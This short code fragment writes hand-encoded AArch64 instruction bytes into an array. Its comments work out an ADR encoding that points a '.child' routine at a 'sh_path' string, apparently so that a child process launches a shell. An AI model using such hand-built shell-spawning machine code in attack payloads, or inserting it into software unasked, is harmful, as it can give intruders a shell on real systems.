    c[0x138] = 0x60; c[0x139] = 0x02; c[0x13A] = 0x00; c[0x13B] = 0xB4;

    // .child at 0x184
    // 0x184: adr x5, sh_path (0x250): offset = 0x250 - 0x184 = 0xCC = 204
    //   immlo = 204 & 3 = 0, immhi = 204 >> 2 = 51
    //   = 0x10000000 | (51 << 5) | 5 = 0x10000665
    c[0x184] = 0x65; c[0x185] = 0x06; c[0x186] = 0x00; c[0x187] = 0x10;
